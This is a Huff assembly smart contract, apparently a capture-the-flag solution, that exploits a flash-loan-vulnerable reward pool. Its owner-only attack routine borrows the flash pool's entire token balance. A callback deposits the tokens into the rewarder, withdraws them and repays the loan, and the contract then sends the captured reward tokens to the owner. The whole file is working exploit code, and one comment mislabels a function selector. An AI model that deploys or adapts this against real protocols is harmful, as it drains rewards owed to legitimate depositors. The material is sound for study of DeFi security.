// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant REWARDER_SLOT = FREE_STORAGE_POINTER()
#define constant FLASH_SLOT = FREE_STORAGE_POINTER()
#define constant LIQ_TOKEN_SLOT = FREE_STORAGE_POINTER()
#define constant REWARD_TOKEN_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    0x80            // [0x80, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x80, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    0x60            // [0x60, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x60, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x20, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    0x40            // [0x40, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x40, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x40, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg) 
    // [OFFSET 0x40]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> liquidity token address (3rd constructor arg) 

    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    msize           // [0x60, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg) 
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg) 
    // [OFFSET 0x40]  000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> liquidity token address (3rd constructor arg) 
    // [OFFSET 0x60]  0000000000000000000000003ca0b5a872d03e7eef3fa3ea2726417b869a3439 -> reward token address (4th constructor arg) 

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [rewarder] - copied rewarder onto stack from byte offset 0x00 in mem
    [REWARDER_SLOT] // [0x01, rewarder] - storage slot where to store rewarder
    sstore          // [] - copied rewarder to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg)

    0x20            // [0x20] - byte offset in memory
    mload           // [flash] - copied flash onto stack from byte offset 0x20 in mem
    [FLASH_SLOT]    // [0x02] - storage slot where flash will be copied to 
    sstore          // [] - copied flash to storage slot 0x02

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg)

    0x40             // [0x40] - byte offset in memory
    mload            // [liq_token] - copied liq_token onto stack from byte offset 0x40 in mem
    [LIQ_TOKEN_SLOT] // [0x03] - storage slot where liq_token will be copied to 
    sstore           // [] - copied liq_token to storage slot 0x03

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg)
    // [SLOT 0x03] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> liquidity token address (3rd constructor arg)

    0x60                // [0x60] - byte offset in memory
    mload               // [reward_token] - copied reward_token onto stack from byte offset 0x60 in mem
    [REWARD_TOKEN_SLOT] // [0x04] - storage slot where reward_token will be copied to 
    sstore              // [] - copied reward_token to storage slot 0x04

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address (1st constructor arg)
    // [SLOT 0x02] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address (2nd constructor arg)
    // [SLOT 0x03] 000000000000000000000000274b028b03a250ca03644e6c578d81f019ee1323 -> liquidity token address (3rd constructor arg)
    // [SLOT 0x04] 0000000000000000000000003ca0b5a872d03e7eef3fa3ea2726417b869a3439 -> reward token address (4th constructor arg)
}

// Modifiers
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

#define macro ONLY_FLASH() = takes (0) returns (0) {
    caller          // [caller]
    [FLASH_SLOT]    // [0x02, caller] - storage slot where owner is stored
    sload           // [flash, caller] - loaded flash pool address onto stack from storage slot 0x02
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_flash        // [is_flash, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_flash:       // is_flash label. execution continues here is the caller is the flash pool
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy `balanceOf(address)` and flash pool into mem to use as calldata for STATICCALL 
    0x70a08231      // [0x70a08231] - func sig
    0x00            // [0x00, 0x70a08231] - byte offset in mem
    mstore          // [] - copied func sig into mem at offset 0x00
    [FLASH_SLOT]    // [0x02] - storage slot where flash pool is
    sload           // [flash] - copied flash pool onto stack from storage slot 0x02
    dup1            // [flash, flash] - duplicated flash to use in future CALL
    0x20            // [0x20, flash, flash] - byte offset in mem
    mstore          // [flash] - copied flash pool into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address

    // STATICCALL into liquidity token
    0x20            // [0x20, flash] - size of return data (uint256)
    0x20            // [0x20, 0x20, flash] - byte offset in mem where return data is copied
    0x24            // [0x24, 0x20, 0x20, flash] - size of calldata
    0x1c            // [0x1c, 0x24, 0x20, 0x20, flash] - byte offset in mem where calldata starts
    [LIQ_TOKEN_SLOT]// [0x03, 0x1c, 0x24, 0x20, 0x20, flash] - storage slot where liq_token is
    sload           // [liq_token, 0x1c, 0x24, 0x20, 0x20, flash] - copied liq_token onto stack from storage slot 0x03
    gas             // [gas, liq_token, 0x1c, 0x24, 0x20, 0x20, flash] - gas to send with staticcall (gasleft())
    staticcall      // [success, flash] - consumes top 6 items and pushes 1 if call was successful, 0 otherwise
    iszero          // [0/1, flash]
    throw_error     // [throw_error, 0/1, flash]
    jumpi           // [flash]

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000000000000070a08231 -> `balanceOf(address)` func sig
    // [OFFSET 0x20]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> return data (uint256)

    // Copy `flashLoan(uint256)` into mem to use as calldata for CALl
    0x9ab603b9      // [0x9ab603b9, flash] - func sig
    0x00            // [0x00, 0x9ab603b9, flash] - byte offset in mem
    mstore          // [flash] - copied func sig into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000000000000000000000000000000000009ab603b9 -> `flashLoan(uint256)` func sig
    // [OFFSET 0x20]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> return data (uint256)

    // CALL into flash pool
    0x00            // [0x00, flash] - size of return data (uint256)
    0x00            // [0x00, 0x00, flash] - byte offset in mem where return data is copied
    0x24            // [0x24, 0x00, 0x00, flash] - size of calldata
    0x1c            // [0x1c, 0x24, 0x00, 0x00, flash] - byte offset in mem where calldata starts
    dup3            // [0x00, 0x1c, 0x24, 0x00, 0x00, flash] - msg.value to send with call
    dup6            // [flash, 0x00, 0x1c, 0x24, 0x00, 0x00, flash] - calling flash pool
    gas             // [gas, flash, 0x00, 0x1c, 0x24, 0x00, 0x00, flash] - gas to send with call (gasleft())
    call            // [success, flash] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero          // [0/1, flash]
    throw_error     // [throw_error, 0/1, flash]
    jumpi           // [flash]
    pop             // []

    // Copy `transfer(address,uint256)` and `balanceOf(address)` func sigs into mem to use as calldata for STATICCALL and CALl
    0xa9059cbb      // [0xa9059cbb] - func sig
    0x00            // [0x00, 0xa9059cbb] - byte offset in mem
    mstore          // [] - copied func sig into mem at offset 0x00
    0x70a08231      // [0x70a08231] - func sig
    0x20            // [0x20, 0x70a08231] - byte offset in mem
    mstore          // [] - copied func sig into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 ->`balanceOf(address)` func sig

    // Copy self into mem to use as calldata for STATICCALL
    address         // [self]
    0x40            // [0x40, self] - byte offset in mem
    mstore          // [] - copied self into mem at offset 0x40

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 ->`balanceOf(address)` func sig
    // [OFFSET 0x40]  0000000000000000000000006B63B0441371ddFbD65A65Ef27642e7A622f29dD -> self

    // STATICCALL into reward token
    [REWARD_TOKEN_SLOT] // [0x04] - storage slot where reward token is
    sload               // [reward] - copied reward onto stack from storage slot 0x04
    0x20                // [0x20, reward] - size of return data (uint256)
    0x40                // [0x40, 0x20, reward] - byte offset in mem where return data is copied
    0x24                // [0x24, 0x40, 0x20, reward] - size of calldata
    0x3c                // [0x3c, 0x24, 0x40, 0x20, reward] - byte offset in mem where calldata starts
    dup5                // [reward, 0x3c, 0x24, 0x40, 0x20, reward] - calling reward
    gas                 // [gas, reward, 0x3c, 0x24, 0x40, 0x20, reward] - gas to send with staticcall (gasleft())
    staticcall          // [success, reward] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
    iszero              // [0/1, reward]
    throw_error         // [throw_error, 0/1, reward]
    jumpi               // [reward]

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000000000000000000000000000000000000070a08231 ->`balanceOf(address)` func sig
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000056b3950ef710bcc00 -> return data (uint256)

    // Copy owner into mem to use as calldata for CALL
    caller              // [owner, reward] - msg.sender is caller due to modifier
    0x20                // [0x20, owner, reward] - byte offset in mem
    mstore              // [reward] - copied owner into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [OFFSET 0x40]  0000000000000000000000000000000000000000000000056b3950ef710bcc00 -> return data (uint256)

    // CALL into reward token
    0x00               // [0x00, reward] - size of return data
    dup1               // [0x00, 0x00, reward] - byte offset in mem where return data is copied
    0x44               // [0x44, 0x00, 0x00, reward] - size of calldata
    0x1c               // [0x1c 0x44, 0x00, 0x00, reward] - byte offset in mem where calldata starts
    dup3               // [0x00, 0x1c 0x44, 0x00, 0x00, reward] - msg.value to send with call 
    dup6               // [reward, 0x00, 0x1c 0x44, 0x00, 0x00, reward] - calling reward
    gas                // [gas, reward, 0x00, 0x1c 0x44, 0x00, 0x00, reward] - gas to send with call (gasleft())
    call               // [success, reward] - consumes top 6 items and pushes 1 if call did not revert, 0 otherwise
    iszero             // [0/1, reward]
    throw_error        // [throw_error, 0/1, reward]
    jumpi              // [reward]
    pop                // []

    stop
}

// FLash loan callback function
#define macro FLASH_CALLBACK() = takes(1) returns (0) {
    // takes: [amount] 
    // Copy `approve(address,uint256)` func sig & args into memory to use as calldata for CALL
    0x095ea7b3       // [0x095ea7b3, amount] - func sig
    0x00             // [0x00, 0x095ea7b3, amount] - byte offset in mem
    mstore           // [amount] - copied func sig into mem at offset 0x00
    [REWARDER_SLOT]  // [0x01, amount] - storage slot where rewarder pool is
    sload            // [rewarder, amount] - copied rewarder onto stack from storage slot 0x01
    dup1             // [rewarder, rewarder, amount] - duplicated rewarder for future CALLs
    0x20             // [0x20, rewarder, rewarder, amount] - byte offset in mem
    mstore           // [rewarder, amount] - copied rewarder into mem at offset 0x20
    swap1            // [amount, rewarder] - swapped 1st and 2nd stack items
    0x40             // [0x40, amount, rewarder] - byte offset in mem
    mstore           // [rewarder] - copied amount into mem at offset 0x40

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000095ea7b3 -> approve(address,uint256)` func sig
    // [OFFSET 0x20]  0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> rewarder pool address
    // [OFFSET 0x40]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> amount (uint256)

    // CALL into liquidity token 
    [LIQ_TOKEN_SLOT] // [0x03, rewarder] - storage slot where liq token is
    sload            // [liq_token, rewarder] - copied liq token onto stack from storage slot 0x03
    0x00             // [0x00, liq_token, rewarder] - size of return data
    dup1             // [0x00, 0x00, liq_token, rewarder] - byte offset in mem where return data is copied
    0x44             // [0x44, 0x00, 0x00, liq_token, rewarder] - size of calldata
    0x1c             // [0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - msg.value to send with call
    dup6             // [liq_token, 0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - calling liq_token
    gas              // [gas, liq_token, 0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - gas to send with call (gasleft())
    call             // [success, liq_token, rewarder] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, liq_token, rewarder]
    throw_error      // [throw_error, 0/1, liq_token, rewarder]
    jumpi            // [liq_token, rewarder]

    // Copy `deposit(uint256)` into mem to use as calldata for CALL
    0xb6b55f25       // [0xb6b55f25, liq_token, rewarder] - func sig
    0x20             // [0x20, 0xb6b55f25, liq_token, rewarder] - byte offset in mem
    mstore           // [liq_token, rewarder] - copied func sig into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000095ea7b3 -> approve(address,uint256)` func sig
    // [OFFSET 0x20]  00000000000000000000000000000000000000000000000000000000b6b55f25 -> `deposit(uint256)` func sig
    // [OFFSET 0x40]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> amount (uint256)

    // CALL into rewarder
    0x00             // [0x00, liq_token, rewarder] - size of return data
    dup1             // [0x00, 0x00, liq_token, rewarder] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x00, 0x00, liq_token, rewarder] - size of calldata
    0x3c             // [0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - msg.value to send with call
    dup7             // [rewarder, 0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - calling rewarder
    gas              // [gas, rewarder, 0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - gas to send with call (gasleft())
    call             // [success, liq_token, rewarder] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, liq_token, rewarder]
    throw_error      // [throw_error, 0/1, liq_token, rewarder]
    jumpi            // [liq_token, rewarder]

    // Copy `withdraw(uint256)` func sig into mem to use as calldata for CALL
    0x2e1a7d4d       // [0x2e1a7d4d, liq_token, rewarder] - func sig
    0x20             // [0x20, 0x2e1a7d4d, liq_token, rewarder] - byte offset in mem
    mstore           // [liq_token, rewarder] - copied func sig into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000095ea7b3 -> approve(address,uint256)` func sig
    // [OFFSET 0x20]  00000000000000000000000000000000000000000000000000000000b6b55f25 -> `withdraw(uint256)` func sig
    // [OFFSET 0x40]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> amount (uint256)

    // CALL into rewarder
    0x00             // [0x00, liq_token, rewarder] - size of return data
    dup1             // [0x00, 0x00, liq_token, rewarder] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x00, 0x00, liq_token, rewarder] - size of calldata
    0x3c             // [0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - msg.value to send with call
    dup7             // [rewarder, 0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - calling rewarder
    gas              // [gas, rewarder, 0x00, 0x3c, 0x24, 0x00, 0x00, liq_token, rewarder] - gas to send with call (gasleft())
    call             // [success, liq_token, rewarder] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, liq_token, rewarder]
    throw_error      // [throw_error, 0/1, liq_token, rewarder]
    jumpi            // [liq_token, rewarder]

    // Copy `transfer(address,uint256)` func sigand flash pool into mem to use as calldata for CALL
    0xa9059cbb       // [0xa9059cbb, liq_token, rewarder] - func sig
    0x00             // [0x00, 0xa9059cbb, liq_token, rewarder] - byte offset in mem
    mstore           // [liq_token, rewarder] - copied func sig into mem at offset 0x00
    caller           // [flash, liq_token, rewarder] - msg.sender is flash pool due to modifier
    0x20             // [0x20, flash, liq_token, rewarder] - byte offset in mem
    mstore           // [liq_token, rewarder] - copied flash intoo mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000a9059cbb -> `transfer(address,uint256)` func sig
    // [OFFSET 0x20]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> flash pool address
    // [OFFSET 0x40]  00000000000000000000000000000000000000000000D3C21BCECCEDA1000000 -> amount (uint256)

    // CALL into liquidity token
    0x00             // [0x00, liq_token, rewarder] - size of return data
    dup1             // [0x00, 0x00, liq_token, rewarder] - byte offset in mem where return data is copied
    0x44             // [0x44, 0x00, 0x00, liq_token, rewarder] - size of calldata
    0x1c             // [0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - msg.value to send with call
    dup6             // [liq_token, 0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - calling liq_token
    gas              // [gas, liq_token, 0x00, 0x1c, 0x44, 0x00, 0x00, liq_token, rewarder] - gas to send with call (gasleft())
    call             // [success, liq_token, rewarder] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, liq_token, rewarder]
    throw_error      // [throw_error, 0/1, liq_token, rewarder]
    jumpi            // [liq_token, rewarder]
    pop              // [rewarder]
    pop              // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x4fd9cb81   // [0x4fd9cb81, func_sig, func_sig] - pushing func sig of 'receiveFlashLoan(uint256)' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    callback     // [callback, 0/1, func_sig] - callback is a label (byte offset) for the flashloan callback instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()

    callback:    // label for flash loan callback instructions
        ONLY_FLASH()
        0x04
        calldataload
        FLASH_CALLBACK() // [amount]
}
